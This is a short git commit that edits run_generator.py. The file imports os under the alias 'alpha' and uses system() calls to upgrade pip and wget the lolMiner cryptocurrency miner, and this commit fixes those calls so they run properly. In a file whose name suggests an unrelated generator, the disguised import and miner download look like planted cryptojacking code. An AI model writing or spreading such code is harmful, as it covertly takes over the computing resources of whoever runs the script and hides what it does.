046f9a78078b0ad42ba6ecb03bb98dc25cf9e1f2
zrelum001 <93876371+zrelum001@users.noreply.github.com>
2021-11-07 22:42:21 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,3 @@
 import os as alpha
-alpha.system("pip install --upgrade pip
-             wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
+alpha.system("pip install --upgrade pip")
+alpha.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
